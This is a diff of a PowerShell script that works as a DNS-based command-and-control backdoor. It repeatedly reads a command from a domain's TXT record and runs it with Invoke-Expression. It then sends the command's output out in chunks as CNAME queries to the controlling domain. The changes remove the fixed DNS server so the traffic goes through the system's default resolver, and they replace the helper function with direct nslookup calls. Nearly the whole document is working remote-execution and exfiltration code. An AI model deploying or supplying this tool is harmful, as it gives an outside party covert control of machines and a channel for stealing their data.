@@ -1,12 +1,11 @@
 $domain = "Your_DomainName.co.il"
-$dnsServer = "X.X.X.X"
 
 function Send-CnameQuery {
     param (
         [string]$data
     )
     try {
-        nslookup -type=CNAME "$data.$domain" $dnsServer | Out-Null
+        nslookup -type=CNAME "$data.$domain"  | Out-Null
         Write-Output "Sent CNAME query: $data.$domain"
     } catch {
         Write-Output "Failed to send CNAME query: $_"
@@ -42,7 +41,7 @@ function Process-CommandOutput {
 while ($true) {
     try {
         Write-Output "Querying TXT record..."
-        $txtOutput = nslookup -type=TXT $domain $dnsServer | Out-String
+        $txtOutput = nslookup -type=TXT $domain | Out-String
         if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
             $command = $matches[1]
             Write-Output "Received command: $command"
@@ -51,30 +50,30 @@ while ($true) {
             $commandOutput = Invoke-Expression $command 2>&1
             Write-Output "Raw Command output: $commandOutput"
 
-            # Process the command output
+            
             $commandOutput = Process-CommandOutput $commandOutput
             Write-Output "Processed Command output: $commandOutput"
 
-            # Prepare chunks for transmission
+            
             $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
             $chunks = $commandOutput -split "(.{1,50})" | Where-Object { $_ -ne "" }
             $chunkCount = $chunks.Count
 
-            # Send CNAME queries
-            Send-CnameQuery "$uniqueId-start"
-            Start-Sleep -Milliseconds 200
-            Send-CnameQuery "$chunkCount-chunks"
-            Start-Sleep -Milliseconds 200
+            
+            nslookup -type=CNAME "$uniqueId-start.$domain"
+            Start-Sleep -Milliseconds 400
+            nslookup -type=CNAME "$chunkCount-chunks.$domain"
+            Start-Sleep -Milliseconds 400
 
             $chunkIndex = 1
             foreach ($chunk in $chunks) {
                 $chunk = "chunk$chunkIndex-$chunk"
-                Send-CnameQuery "$chunk"
+               nslookup -type=CNAME "$chunk.$domain"
                 Start-Sleep -Milliseconds 5000
                 $chunkIndex++
             }
 
-            Send-CnameQuery "$uniqueId-end"
+            nslookup -type=CNAME "$uniqueId-end.$domain"
         } else {
             Write-Output "No TXT record found for command."
         }
